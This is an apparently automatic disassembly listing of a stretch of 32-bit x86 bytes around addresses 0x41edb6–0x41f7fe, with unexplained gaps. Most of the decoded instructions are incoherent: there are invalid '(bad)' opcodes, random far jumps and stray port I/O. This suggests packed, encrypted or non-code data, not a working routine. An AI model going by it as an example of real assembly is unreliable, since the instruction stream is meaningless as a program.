  41edb6:	add    edi,0x9de67cd2
  41edbc:	adc    BYTE PTR [edx-0xc0214e7],ch
  41edc2:	xchg   esp,eax
  41edc3:	mov    bh,0xaa
  41edc5:	xchg   ebx,eax
  41edc6:	call   edi
  41edc8:	fstp   st(5)
  41edca:	lock mov dl,0x46
  41edcd:	push   ebp
  41edce:	and    DWORD PTR [ebx],ecx
  41edd0:	and    al,0x7
  41edd2:	push   esi
  41edd3:	fsubrp st(2),st
  41edd5:	jle    0x41ede9
  41edd7:	vpmulhuw xmm1,xmm1,xmm6
  41eddb:	test   eax,0x47b17d31
  41ede0:	loop   0x41ed66
  41ede2:	push   ss
  41ede3:	xchg   esi,eax
  41ede4:	pop    esp
  41ede5:	push   cs
  41ede6:	clc    
  41ede7:	push   es
  41ede8:	sbb    esi,DWORD PTR [edx+0x5e]
  41edeb:	xor    al,0x76
  41eded:	aas    
  41edee:	push   esp
  41edef:	pop    esi
  41edf0:	mov    ebp,0xbe7d7ee5
  41edf5:	cmp    edi,0x6e8a6b55
  41edfb:	fild   DWORD PTR [ebx+0x52]
  41edfe:	add    dh,BYTE PTR [ecx]
  41ee00:	push   eax
  41ee01:	ror    ecx,0x20
  41ee04:	lods   al,BYTE PTR ds:[esi]
  41ee05:	mov    ebp,0x3279f620
  41ee0a:	mov    dl,0x89
  41ee0c:	jae    0x41ee3f
  41ee0e:	add    al,0xba
  41ee10:	add    al,0xc1
  41ee12:	jp     0x41ee41
  41ee14:	jge    0x41ee19
  41ee16:	inc    esi
  41ee17:	loop   0x41ee4d
  41ee19:	imul   eax,DWORD PTR [edi+0x1c452ea2],0x1a
  41ee20:	(bad)  
  41ee21:	fldlg2 
  41ee23:	std    
  41ee24:	lods   eax,DWORD PTR ds:[esi]
  41ee25:	fmul   QWORD PTR [eax]
  41ee27:	mov    ch,al
  41ee29:	and    dl,BYTE PTR [esi-0x12]
  41ee2c:	stc    
  41ee2d:	mov    eax,0x205c2b1
  41ee32:	test   DWORD PTR [edi+0x2],ebp
  41ee35:	call   DWORD PTR [ebp+0x5901c623]
  41ee3b:	pop    edx
  41ee3c:	sbb    esi,DWORD PTR [esi+ecx*4+0x7f]
  41ee40:	xchg   esp,ecx
  41ee42:	inc    ebx
  41ee43:	cmp    eax,0xfe4ff711
  41ee48:	retf   0x311b
  41ee4b:	jmp    0x5721cfc5
  41ee50:	or     BYTE PTR ds:0xc9980dac,al
  41ee56:	das    
  41ee57:	pop    eax
  41ee58:	xchg   BYTE PTR [eax+0x42],dl
  41ee5b:	and    ah,dh
  41ee5d:	loop   0x41ee3a
  41ee5f:	das    
  41ee60:	jecxz  0x41eed6
  41ee62:	and    bl,BYTE PTR [eax+ebx*8-0x23920016]
  41ee69:	test   eax,0xbd0d81
	...
  41eed6:	add    eax,0x7b197956
  41eedb:	aas    
  41eedc:	gs pop esi
  41eede:	pop    edx
  41eedf:	repnz call 0xf2f0:0x78c014e7
  41eee7:	dec    ebx
  41eee8:	add    DWORD PTR [eax],eax
  41eeea:	inc    DWORD PTR [eax]
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	mov    ds:0x74a91280,al
  41eef3:	cmp    al,0xde
  41eef5:	call   0xc012:0x708e71dd
  41eefc:	jp     0x41ef42
  41eefe:	push   edx
  41eeff:	test   eax,0x60df404c
  41ef04:	imul   esi,ebp,0x78
  41ef07:	jnp    0x41ee8d
  41ef09:	fistp  WORD PTR [edi+0x3c]
  41ef0c:	stc    
  41ef0d:	pop    ebp
  41ef0e:	outs   dx,BYTE PTR ds:[esi]
  41ef0f:	test   DWORD PTR [edi+eiz*4],esi
  41ef12:	test   BYTE PTR [esi+ebx*8+0x7e],ah
  41ef16:	lds    edx,FWORD PTR [ecx+0x1b631fbc]
  41ef1c:	jecxz  0x41ef2d
  41ef1e:	loopne 0x41ef64
  41ef20:	adc    DWORD PTR [eax],ebx
  41ef22:	xlat   BYTE PTR ds:[ebx]
  41ef23:	dec    edx
  41ef24:	mov    ebp,0xe4e97e6b
  41ef29:	mov    bl,0x3f
  41ef2b:	pop    ss
  41ef2c:	jbe    0x41ef76
  41ef2e:	int3   
  41ef2f:	loope  0x41ef31
  41ef31:	cwde   
  41ef32:	fadd   DWORD PTR [ebp-0x4e]
  41ef35:	mov    cl,0x3d
  41ef37:	and    ah,BYTE PTR [edi+0x45a6e9c3]
  41ef3d:	mov    ah,0x42
  41ef3f:	add    ch,cl
  41ef41:	mov    bl,0xd8
  41ef43:	xor    BYTE PTR [ecx],ah
  41ef45:	sbb    cl,BYTE PTR [eax-0x7c8c3be9]
  41ef4b:	fstp   TBYTE PTR [eax]
  41ef4d:	mov    edx,0x5136c56
  41ef52:	inc    edi
  41ef53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef54:	or     DWORD PTR [ebx],ebp
  41ef56:	xchg   ebx,eax
  41ef57:	fistp  WORD PTR [ebx]
  41ef59:	stos   BYTE PTR es:[edi],al
  41ef5a:	and    BYTE PTR [edx],bl
  41ef5c:	mov    BYTE PTR [edi+0x65b473e2],al
  41ef62:	dec    esi
  41ef63:	lea    eax,[esi+eiz*4-0x32]
  41ef67:	fisttp QWORD PTR ds:0x405acee9
  41ef6d:	sbb    al,0x2a
  41ef6f:	push   ebx
  41ef70:	(bad)  [ebp-0x7c]
  41ef73:	ret    0x7296
  41ef76:	je     0x41ef94
  41ef78:	push   es
  41ef79:	add    DWORD PTR [esi],0xcea968e7
  41ef7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef80:	iret   
  41ef81:	cmp    al,0xc2
  41ef83:	dec    edx
  41ef84:	dec    eax
  41ef85:	mov    bl,0x9
  41ef87:	or     al,cl
  41ef89:	xchg   edi,eax
  41ef8a:	jae    0x41efd3
  41ef8c:	jo     0x41efba
  41ef8e:	aam    0xea
  41ef90:	es and al,0x48
  41ef93:	mov    ch,0x7
  41ef95:	and    ah,BYTE PTR [eax+0x5531ce31]
  41ef9b:	ja     0x41ef87
  41ef9d:	lock dec edx
  41ef9f:	mov    ah,0xa8
  41efa1:	adc    dl,cl
  41efa3:	jmp    0x41ef6c
  41efa5:	jb     0x41eff1
  41efa7:	mov    ss,WORD PTR [eax+eax*4-0x527f095b]
  41efae:	jmp    0x5dea:0x47c87ecf
  41efb5:	retf   0xda26
  41efb8:	jp     0x41ef66
  41efba:	(bad)  
  41efbb:	(bad)  
  41efbd:	mov    dl,ch
  41efbf:	stc    
  41efc0:	data16 aam 0x23
  41efc3:	pop    esp
  41efc4:	xor    al,0x33
  41efc6:	loope  0x41f007
  41efc8:	mov    DWORD PTR [ebx-0x11c22806],eax
  41efce:	mov    ebp,0xff4b1b6e
  41efd3:	dec    ecx
  41efd4:	mov    al,ds:0x5d79bb37
  41efd9:	mov    edi,DWORD PTR [edi]
  41efdb:	fld    TBYTE PTR [ecx]
  41efdd:	jno    0x41efb8
  41efdf:	add    al,0xd4
  41efe1:	push   ss
  41efe2:	adc    eax,0x2a4d7f56
  41efe7:	(bad)  
  41efe8:	sub    DWORD PTR [ecx+0x4a98cc],eax
	...
  41f056:	mov    ecx,0xff25bf5d
  41f05b:	out    0xbb,eax
  41f05d:	fisttp QWORD PTR [ecx+0x0]
  41f060:	lock imul ebx,DWORD PTR [edi],0xffffffef
  41f064:	pop    eax
  41f065:	jae    0x41f058
  41f067:	dec    esp
  41f068:	add    DWORD PTR [eax],eax
  41f06a:	inc    DWORD PTR [eax]
  41f06c:	add    BYTE PTR [eax],al
  41f06e:	jmp    0xaf8b:0x67d909bd
  41f075:	xchg   edi,eax
  41f076:	fcom   DWORD PTR [ebp+eax*1-0x499b9d8f]
  41f07d:	mov    BYTE PTR [ebp-0x54f3f830],dl
  41f083:	out    0x25,al
  41f085:	push   ecx
  41f086:	push   ebp
  41f087:	addr16 mov ds:0x2e34,eax
  41f08b:	add    eax,0x6910c3b2
  41f090:	dec    edx
  41f091:	dec    ebp
  41f092:	int3   
  41f093:	pop    ebp
  41f094:	adc    al,0xf
  41f096:	sbb    dh,ch
  41f098:	pop    ecx
  41f099:	daa    
  41f09a:	cwde   
  41f09b:	sub    BYTE PTR ds:0xc522a481,al
  41f0a1:	int    0x3f
  41f0a3:	mov    edi,0x3f3ab71f
  41f0a8:	inc    ebp
  41f0a9:	xchg   BYTE PTR ds:0xc5ca,cl
  41f0ae:	stos   BYTE PTR es:[edi],al
  41f0af:	adc    BYTE PTR [eax],cl
  41f0b1:	(bad)  
  41f0b2:	scas   al,BYTE PTR es:[edi]
  41f0b3:	scas   al,BYTE PTR es:[edi]
  41f0b4:	in     al,0x4b
  41f0b6:	or     al,0xe4
  41f0b8:	mov    bh,0x6c
  41f0ba:	cwde   
  41f0bb:	or     BYTE PTR [eax+ebx*4+0x6e],dl
  41f0bf:	div    DWORD PTR [edi]
  41f0c1:	ret    0xac39
  41f0c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0c5:	in     al,0x35
  41f0c7:	push   ds
  41f0c8:	mov    cl,0xcf
  41f0ca:	daa    
  41f0cb:	shl    DWORD PTR [edx-0x1e],cl
  41f0ce:	mov    cl,0x6b
  41f0d0:	ss nop
  41f0d2:	ins    DWORD PTR es:[edi],dx
  41f0d3:	add    eax,0x413529f
  41f0d8:	mov    ah,0x10
  41f0da:	sahf   
  41f0db:	(bad)  
  41f0dc:	xor    al,BYTE PTR ds:0x8329d341
  41f0e2:	mov    ch,0x11
  41f0e4:	test   BYTE PTR [ecx],0x20
  41f0e7:	or     edi,DWORD PTR [eax-0x2c]
  41f0ea:	cld    
  41f0eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ec:	lds    ebp,FWORD PTR [edx+0x18]
  41f0ef:	hlt    
  41f0f0:	iret   
  41f0f1:	loop   0x41f085
  41f0f3:	ds xchg edi,eax
  41f0f5:	push   edi
  41f0f6:	lds    edx,FWORD PTR [edi+edx*4]
  41f0f9:	inc    eax
  41f0fa:	sub    DWORD PTR [ebx+0xa2f6ac3],edi
  41f100:	xchg   ecx,eax
  41f101:	or     al,0x1d
  41f103:	data16 add BYTE PTR [edx+0x2c],ah
  41f107:	ss jecxz 0x41f124
  41f10a:	mov    eax,0x1d1bc511
  41f10f:	push   eax
  41f110:	ins    DWORD PTR es:[edi],dx
  41f111:	jge    0x41f174
  41f113:	aam    0x11
  41f115:	add    BYTE PTR ds:[ebp+0x1aba6881],ah
  41f11c:	enter  0x19a8,0x23
  41f120:	stos   DWORD PTR es:[edi],eax
  41f121:	ins    BYTE PTR es:[edi],dx
  41f122:	jp     0x41f173
  41f124:	lds    ebx,FWORD PTR [ecx]
  41f126:	add    DWORD PTR [ebx+0x47],ebx
  41f129:	add    esi,edx
  41f12b:	mov    esp,0xd93a52ae
  41f130:	test   al,0xc
  41f132:	mov    al,al
  41f134:	push   ebp
  41f135:	loop   0x41f144
  41f137:	js     0x41f0f5
  41f139:	lods   eax,DWORD PTR ds:[esi]
  41f13a:	in     al,dx
  41f13b:	addr16 gs xchg edx,eax
  41f13e:	add    DWORD PTR [edi],edx
  41f140:	inc    esp
  41f141:	xchg   esp,eax
  41f142:	and    eax,0x95c1cbbb
  41f147:	sar    al,1
  41f149:	pop    edx
  41f14a:	pop    ds
  41f14b:	push   ds
  41f14c:	out    0xca,al
  41f14e:	adc    al,0x83
  41f150:	pop    ss
  41f151:	dec    edi
  41f152:	lahf   
  41f153:	pop    ebp
  41f154:	mov    dl,0xeb
  41f156:	jno    0x41f14f
  41f158:	fidivr DWORD PTR [edi+0x6e]
  41f15b:	sbb    eax,0xe4656f1b
  41f160:	out    0x93,eax
  41f162:	(bad)
  41f166:	ret    0xba1b
  41f169:	inc    eax
  41f16a:	shl    ebx,cl
  41f16c:	xchg   edi,eax
	...
  41f1d5:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f1db:	mov    ebx,0x3824ffdf
  41f1e0:	(bad)  
  41f1e1:	jmp    0x4df0:0xf65cead7
  41f1e8:	add    DWORD PTR [eax],eax
  41f1ea:	inc    DWORD PTR [eax]
  41f1ec:	add    BYTE PTR [eax],al
  41f1ee:	clc    
  41f1ef:	out    0x95,al
  41f1f1:	xchg   ebx,eax
  41f1f2:	and    al,0x28
  41f1f4:	jo     0x41f199
  41f1f6:	adc    al,0x8
  41f1f8:	fst    QWORD PTR [ecx]
  41f1fa:	fsub   DWORD PTR [esi+eax*4-0x93dcc14]
  41f201:	pop    eax
  41f202:	jmp    0xd2ef2c9d
  41f207:	test   eax,0xad8f2d5
  41f20c:	mov    ?,WORD PTR [edx]
  41f20e:	adc    DWORD PTR [eax+0x1f],ebp
  41f211:	pushf  
  41f212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f213:	sbb    BYTE PTR fs:[edi+0xb],0xf0
  41f218:	dec    eax
  41f219:	inc    ecx
  41f21a:	pusha  
  41f21b:	add    al,0xd5
  41f21d:	mov    eax,ds:0xa92e2d42
  41f222:	mov    ebp,0x799743e
  41f227:	cld    
  41f228:	mov    ebx,0x83077306
  41f22d:	popa   
  41f22e:	and    BYTE PTR fs:[edi],cl
  41f231:	push   ecx
  41f232:	adc    al,0x6c
  41f234:	xor    eax,0x77006b0
  41f239:	std    
  41f23a:	scas   eax,DWORD PTR es:[edi]
  41f23b:	push   ss
  41f23c:	dec    edi
  41f23d:	lds    ecx,FWORD PTR [ecx+ebx*4+0x62af6c12]
  41f244:	fwait
  41f245:	or     BYTE PTR [edi-0x51],al
  41f248:	jmp    0xe7b98aee
  41f24d:	cmp    eax,0x6a35f0c5
  41f252:	jmp    0xb408:0xcad0e60b
  41f259:	in     eax,0x8f
  41f25b:	call   0x821cef29
  41f260:	dec    ebx
  41f261:	lods   al,BYTE PTR ds:[esi]
  41f262:	or     bh,BYTE PTR [esi+0x5b]
  41f265:	mov    ds:0x363607b4,eax
  41f26a:	out    dx,al
  41f26b:	scas   al,BYTE PTR es:[edi]
  41f26c:	repnz lea esi,[edx]
  41f26f:	div    esp
  41f271:	aad    0xe8
  41f273:	ror    DWORD PTR [edx+esi*8],1
  41f276:	xchg   esi,eax
  41f277:	mov    DWORD PTR [ecx-0xbbff253],eax
  41f27d:	call   0x291fc1e
  41f282:	rol    BYTE PTR [ebx*8-0x6b4fc8d7],cl
  41f289:	mov    ebp,0x2d2309f0
  41f28e:	or     dl,BYTE PTR [esi-0x57]
  41f291:	dec    eax
  41f292:	hlt    
  41f293:	mov    cl,0xe0
  41f295:	(bad)  
  41f297:	icebp  
  41f298:	mov    ebp,0xe0820d60
  41f29d:	pop    ebp
  41f29e:	mov    bl,0x1
  41f2a0:	sub    al,0x9b
  41f2a2:	outs   dx,DWORD PTR ds:[esi]
  41f2a3:	xchg   esp,eax
  41f2a4:	and    DWORD PTR [ebp-0x2fc3872e],ebp
  41f2aa:	add    al,0x63
  41f2ac:	mov    bh,0x8f
  41f2ae:	xchg   edx,eax
  41f2af:	sub    al,0x5d
  41f2b1:	or     BYTE PTR [esi-0x58],ah
  41f2b4:	inc    esp
  41f2b5:	push   DWORD PTR [edi+0x7a]
  41f2b8:	inc    esi
  41f2b9:	mov    eax,ds:0x9b5c7b70
  41f2be:	in     al,0x46
  41f2c0:	mov    ah,0x22
  41f2c2:	imul   esi,DWORD PTR [edi+0xf088a6e],0xffffffcf
  41f2c9:	je     0x41f2db
  41f2cb:	ret    
  41f2cc:	(bad)  
  41f2cd:	sbb    esp,DWORD PTR [edi-0x7c]
  41f2d0:	mov    db3,edi
  41f2d3:	jecxz  0x41f2fb
  41f2d5:	enter  0xc3d5,0x36
  41f2d9:	das    
  41f2da:	lds    eax,FWORD PTR [ebx-0x47]
  41f2dd:	push   esp
  41f2de:	jecxz  0x41f35b
  41f2e0:	out    0xf4,al
  41f2e2:	std    
  41f2e3:	aad    0xdb
  41f2e5:	fsubr  st,st(7)
  41f2e7:	imul   al
  41f2e9:	retf   0xa743
  41f2ec:	rol    DWORD PTR [eax],0x0
	...
  41f353:	add    BYTE PTR [eax],al
  41f355:	add    BYTE PTR [ecx+0x1b],dl
  41f358:	jmp    DWORD PTR [esi-0x1]
  41f35b:	out    0xd9,al
  41f35d:	aas    
  41f35e:	jo     0x41f34d
  41f360:	sahf   
  41f361:	jb     0x41f38d
  41f363:	push   cs
  41f364:	jno    0x41f3e5
  41f366:	out    dx,eax
  41f367:	dec    esi
  41f368:	add    DWORD PTR [eax],eax
  41f36a:	inc    DWORD PTR [eax]
  41f36c:	add    BYTE PTR [eax],al
  41f36e:	push   eax
  41f36f:	arpl   WORD PTR [edx],si
  41f371:	inc    esp
  41f372:	mov    edi,0x83d75809
  41f377:	sub    al,0xd8
  41f379:	ficom  DWORD PTR [ecx+edi*2-0x1ceec3d5]
  41f380:	pop    ds
  41f381:	and    bl,BYTE PTR [esp+ebp*2-0x60]
  41f385:	not    BYTE PTR [ecx+0x299b7267]
  41f38b:	xchg   edi,eax
  41f38c:	call   0x49f3:0x1f59c640
  41f393:	xchg   edi,eax
  41f394:	sub    eax,0xe18c79bc
  41f399:	push   ebp
  41f39a:	daa    
  41f39b:	push   ecx
  41f39d:	xor    ebx,0x87c26a50
  41f3a3:	jb     0x41f3a1
  41f3a5:	out    0x6c,eax
  41f3a7:	pop    edx
  41f3a8:	jg     0x41f371
  41f3aa:	imul   ecx,edx,0x1e097df1
  41f3b0:	cmp    eax,0x75648f0
  41f3b5:	xchg   esi,eax
  41f3b6:	mov    dh,0xf1
  41f3b8:	cwde   
  41f3b9:	stos   BYTE PTR es:[edi],al
  41f3ba:	jg     0x41f439
  41f3bc:	bound  eax,QWORD PTR [edi+0x6a46f74d]
  41f3c2:	rcl    ebx,0x77
  41f3c5:	adc    esp,esp
  41f3c7:	je     0x41f3c3
  41f3c9:	addr16 mov al,ds:0xd8f9
  41f3cd:	jmp    0x41f377
  41f3cf:	sar    BYTE PTR [ebp+ecx*8-0x64f115c],1
  41f3d6:	sub    eax,edx
  41f3d8:	or     BYTE PTR [ebp+0x6],cl
  41f3db:	adc    al,0x6c
  41f3dd:	mov    eax,0xa15865d6
  41f3e2:	(bad)  
  41f3e3:	and    ebp,DWORD PTR [edi+0x58eac2f9]
  41f3e9:	cs into 
  41f3eb:	adc    bl,cl
  41f3ed:	xchg   ebp,eax
  41f3ee:	ins    DWORD PTR es:[edi],dx
  41f3ef:	push   ecx
  41f3f0:	or     al,0x26
  41f3f2:	xchg   DWORD PTR [ebx-0x3c],ecx
  41f3f5:	(bad)  
  41f3f6:	aaa    
  41f3f7:	imul   DWORD PTR [ecx+0x68]
  41f3fa:	and    ebp,DWORD PTR [esi+0x5b]
  41f3fd:	mov    ds:0x741879ce,eax
  41f402:	pop    esi
  41f403:	shl    DWORD PTR [edx+edi*8+0x24],0xb
  41f408:	mov    al,ds:0x4746d8d5
  41f40d:	lock cmp esi,DWORD PTR [ecx+0x62]
  41f411:	cmp    ah,BYTE PTR [esi-0x748ae78b]
  41f417:	in     al,0xff
  41f419:	and    ebx,eax
  41f41b:	mov    edi,0x7e7f04e6
  41f420:	int    0x2a
  41f422:	ror    DWORD PTR [eax+0x6c],cl
  41f425:	(bad)  
  41f426:	frstor [ebx]
  41f428:	jecxz  0x41f45a
  41f42a:	or     eax,0x5207b47f
  41f42f:	fidiv  DWORD PTR [esi+0x1699a1da]
  41f435:	push   cs
  41f436:	aas    
  41f437:	pop    esi
  41f438:	fs jle 0x41f451
  41f43b:	sbb    edx,DWORD PTR [ebx-0x4d]
  41f43e:	and    ax,0x447a
  41f442:	fiadd  WORD PTR [esi]
  41f444:	sar    eax,0x27
  41f447:	cmp    eax,0x4fb49136
  41f44c:	xor    esp,edx
  41f44e:	push   esp
  41f44f:	fstp   QWORD PTR [esp+0x23]
  41f453:	mov    eax,0x77ba7ac6
  41f458:	pop    ss
  41f459:	fwait
  41f45a:	js     0x41f422
  41f45c:	fadd   st,st(5)
  41f45e:	inc    ecx
  41f45f:	add    dl,BYTE PTR [edx]
  41f461:	data16 sar BYTE PTR [ebx],0xc5
  41f465:	push   eax
  41f466:	test   BYTE PTR [edi+0x3],0x8a
  41f46a:	inc    eax
  41f46b:	inc    edx
  41f46c:	xor    DWORD PTR [eax],eax
	...
  41f4d6:	cmp    al,0xe7
  41f4d8:	imul   ebp,edi,0xfffffffb
  41f4db:	out    dx,eax
  41f4dc:	mov    esp,0xd5fd13f7
  41f4e1:	mov    ch,0xe9
  41f4e3:	and    BYTE PTR [eax],ah
  41f4e5:	jg     0x41f4d5
  41f4e7:	dec    edi
  41f4e8:	add    DWORD PTR [eax],eax
  41f4ea:	inc    DWORD PTR [eax]
  41f4ec:	add    BYTE PTR [eax],al
  41f4ee:	aam    0x4f
  41f4f0:	in     al,dx
  41f4f1:	or     eax,0xf7f9e6fb
  41f4f6:	mov    WORD PTR [edx-0x1c],gs
  41f4f9:	ins    BYTE PTR es:[edi],dx
  41f4fa:	add    ebp,DWORD PTR [ebx-0x549b3298]
  41f500:	(bad)  
  41f501:	mov    ds:0x62c683cc,eax
  41f506:	or     bl,BYTE PTR [ecx-0x40]
  41f509:	dec    edx
  41f50a:	leave  
  41f50b:	stos   DWORD PTR es:[edi],eax
  41f50c:	call   0x386a:0x7cc42955
  41f513:	mov    ds:0x31808354,eax
  41f518:	mov    dl,0x6d
  41f51a:	add    al,0x23
  41f51c:	loopne 0x41f4b2
  41f51e:	xor    DWORD PTR [ebp+eax*1-0x1eeb5416],ebp
  41f525:	pop    edi
  41f526:	mov    ds:0xa2adc674,eax
  41f52b:	sub    DWORD PTR [ecx],esp
  41f52d:	mov    dl,0xc9
  41f52f:	shl    BYTE PTR [ecx+eax*4+0x24],0x61
  41f534:	lahf   
  41f535:	popf   
  41f536:	xor    BYTE PTR [eax],ch
  41f538:	inc    edx
  41f539:	nop
  41f53a:	push   eax
  41f53b:	dec    ebx
  41f53c:	pop    es
  41f53d:	sbb    dh,dl
  41f53f:	dec    ecx
  41f540:	adc    ebp,DWORD PTR ds:0xc03129eb
  41f546:	test   cl,0xdf
  41f549:	inc    ebx
  41f54a:	(bad)  
  41f54b:	or     al,0xdd
  41f54d:	imul   eax,DWORD PTR [eax+0x2b93c31c],0xffffff96
  41f554:	test   bl,bl
  41f556:	mov    DWORD PTR [eax+0x5b],edi
  41f559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f55a:	and    bh,BYTE PTR [ecx+0xaa61e12]
  41f560:	in     eax,0x92
  41f562:	dec    ebx
  41f563:	adc    eax,0x68f7926
  41f568:	mov    eax,ds:0x19faeabe
  41f56d:	mov    bh,0x20
  41f56f:	fisttp QWORD PTR [ecx+0x53]
  41f572:	inc    eax
  41f573:	test   DWORD PTR [edi],edx
  41f575:	adc    edi,esp
  41f577:	(bad)  
  41f578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f579:	out    dx,al
  41f57a:	jo     0x41f564
  41f57c:	mov    ebp,0x4cb1c0e4
  41f581:	or     eax,0x6de383e5
  41f586:	retf   
  41f587:	std    
  41f588:	stc    
  41f589:	test   eax,0x67f3e283
  41f58e:	(bad)  
  41f58f:	cli    
  41f590:	es in  eax,0xb2
  41f593:	sbb    bl,BYTE PTR [ebx]
  41f595:	pop    ecx
  41f596:	inc    ebp
  41f597:	repz mov WORD PTR [ebp-0x21],ss
  41f59b:	push   ds
  41f59c:	pop    eax
  41f59d:	daa    
  41f59e:	icebp  
  41f59f:	popa   
  41f5a0:	sub    al,0x7
  41f5a2:	pop    esi
  41f5a3:	push   cs
  41f5a4:	shr    BYTE PTR [eax-0x3],1
  41f5a7:	scas   eax,DWORD PTR es:[edi]
  41f5a8:	pop    ebx
  41f5a9:	pop    esp
  41f5aa:	ins    DWORD PTR es:[edi],dx
  41f5ab:	jno    0x41f5df
  41f5ad:	jp     0x41f603
  41f5af:	rol    DWORD PTR [ecx],1
  41f5b1:	mov    ebp,0xb0f53f43
  41f5b6:	clc    
  41f5b7:	pop    ebx
  41f5b8:	hlt    
  41f5b9:	imul   DWORD PTR [ecx]
  41f5bb:	loopne 0x41f562
  41f5bd:	and    DWORD PTR [ecx],0x2df5b94
  41f5c3:	icebp  
  41f5c4:	lds    edi,FWORD PTR [edx-0x4a111bcf]
  41f5ca:	arpl   WORD PTR [esi-0xeb4da9d],bp
  41f5d0:	mov    DWORD PTR [esi+0x2842adbf],ebp
  41f5d6:	cmp    esi,DWORD PTR ss:[eax]
  41f5d9:	ja     0x41f5a6
  41f5db:	or     DWORD PTR [ebx+0x2f],0x5831fe38
  41f5e2:	dec    esp
  41f5e3:	out    dx,al
  41f5e4:	cmp    bh,dl
  41f5e6:	push   edi
  41f5e7:	mov    ebp,0x34c55015
  41f5ec:	inc    eax
	...
  41f655:	add    BYTE PTR [eax+0x34],bh
  41f658:	add    bh,bl
  41f65a:	dec    esi
  41f65b:	(bad)  
  41f65c:	stc    
  41f65d:	mov    bh,0xb7
  41f65f:	jmp    0x63b6:0xf1fad422
  41f666:	in     eax,dx
  41f667:	push   eax
  41f668:	add    DWORD PTR [eax],eax
  41f66a:	inc    DWORD PTR [eax]
  41f66c:	add    BYTE PTR [eax],al
  41f66e:	js     0x41f623
  41f670:	lahf   
  41f671:	adc    ch,BYTE PTR [ebp+0x6b]
  41f674:	xor    al,0xcf
  41f676:	fsub   DWORD PTR [eax+0x7cb6c752]
  41f67c:	in     eax,dx
  41f67d:	(bad)  
  41f67e:	(bad)  
  41f67f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f680:	add    DWORD PTR [esi],esi
  41f682:	test   al,0x7f
  41f684:	add    al,al
  41f686:	ficom  DWORD PTR [ecx]
  41f688:	test   ebp,ebx
  41f68a:	pushf  
  41f68b:	inc    esp
  41f68c:	xchg   bh,dl
  41f68e:	rcr    edi,cl
  41f690:	xchg   BYTE PTR [edi-0x59592d31],cl
  41f696:	scas   eax,DWORD PTR es:[edi]
  41f697:	cmp    BYTE PTR [ebx],0xad
  41f69a:	rcl    BYTE PTR [esi+edi*2-0x36],1
  41f69e:	adc    eax,0x5c9cd0b9
  41f6a3:	push   cs
  41f6a4:	loop   0x41f656
  41f6a6:	dec    dl
  41f6a8:	mov    WORD PTR [edx-0x6baefdb8],es
  41f6ae:	jmp    0xdc64842e
  41f6b3:	in     al,dx
  41f6b4:	sbb    eax,0x162391e5
  41f6b9:	mov    eax,ds:0x8cdefcd8
  41f6be:	stc    
  41f6bf:	out    0x80,al
  41f6c1:	add    al,0x6e
  41f6c3:	mov    bl,0x26
  41f6c5:	add    eax,0x7ff25fbd
  41f6ca:	jmp    0x5e289c14
  41f6cf:	xor    BYTE PTR [edx+0x18210fab],ah
  41f6d5:	aad    0x46
  41f6d7:	call   0xebefc24b
  41f6dc:	jnp    0x41f6da
  41f6de:	fld1   
  41f6e0:	mov    bl,0x23
  41f6e2:	xor    cl,al
  41f6e4:	scas   eax,DWORD PTR es:[edi]
  41f6e5:	push   ds
  41f6e6:	(bad)  
  41f6e7:	addr16 mov bl,0xbc
  41f6ea:	fidiv  WORD PTR fs:[edx]
  41f6ed:	xchg   DWORD PTR [eax],eax
  41f6ef:	(bad)  [esi]
  41f6f1:	cli    
  41f6f2:	inc    ebx
  41f6f3:	cmp    bh,dl
  41f6f5:	test   BYTE PTR [esi+0x7a],al
  41f6f8:	test   eax,0x7073bd84
  41f6fd:	cmc    
  41f6fe:	pop    esp
  41f6ff:	and    BYTE PTR [ebp-0x482d62c],0xe6
  41f706:	cmp    al,BYTE PTR [esi+edx*8+0x70]
  41f70a:	sti    
  41f70b:	add    cl,dh
  41f70d:	mov    ebp,0x248a1a1a
  41f712:	(bad)  
  41f713:	popa   
  41f714:	jl     0x41f706
  41f716:	shl    DWORD PTR [eax+0x379d1a12],cl
  41f71c:	aas    
  41f71d:	enter  0x970,0xcb
  41f721:	push   esi
  41f722:	push   ecx
  41f723:	push   ss
  41f724:	loop   0x41f70c
  41f726:	sub    edx,DWORD PTR [esi]
  41f728:	mov    ebp,0xb662ab90
  41f72d:	mov    eax,0x251cf751
  41f732:	aad    0xcf
  41f734:	aas    
  41f735:	test   BYTE PTR [eax+0x36085dc5],bl
  41f73b:	das    
  41f73c:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41f73e:	sub    ebp,0x45199ac1
  41f744:	inc    eax
  41f745:	add    al,0xb
  41f747:	scas   al,BYTE PTR es:[edi]
  41f748:	xor    eax,0x10399fe
  41f74d:	and    DWORD PTR [ecx+0x6902e5a0],0x5b
  41f754:	out    dx,eax
  41f755:	adc    BYTE PTR [ebx+0x35],bh
  41f758:	pushf  
  41f759:	scas   al,BYTE PTR es:[edi]
  41f75a:	test   al,0x19
  41f75c:	loope  0x41f73c
  41f75e:	shr    BYTE PTR [ecx],cl
  41f760:	inc    edx
  41f761:	xor    dl,BYTE PTR [ebx+0x5]
  41f764:	stos   BYTE PTR es:[edi],al
  41f765:	fs cs leave 
  41f768:	jns    0x41f745
  41f76a:	mov    WORD PTR [ebp+0x8],fs
	...
  41f7d4:	add    BYTE PTR [eax],al
  41f7d6:	xchg   edx,eax
  41f7d7:	cmp    al,0x23
  41f7d9:	jle    0x41f78a
  41f7db:	jg     0x41f7bc
  41f7dd:	cld    
  41f7de:	call   0x1157:0x246c62d2
  41f7e5:	adc    ebp,esp
  41f7e7:	push   ecx
  41f7e8:	add    DWORD PTR [eax],eax
  41f7ea:	inc    DWORD PTR [eax]
  41f7ec:	add    BYTE PTR [eax],al
  41f7ee:	rcr    DWORD PTR [esp+ebp*2-0xf],0x9f
  41f7f3:	loope  0x41f814
  41f7f5:	pusha  
  41f7f6:	rcl    BYTE PTR [ebx+eiz*1-0x15c23496],0x7d
  41f7fe:	les    ecx,FWORD PTR [ebp-0x7f]
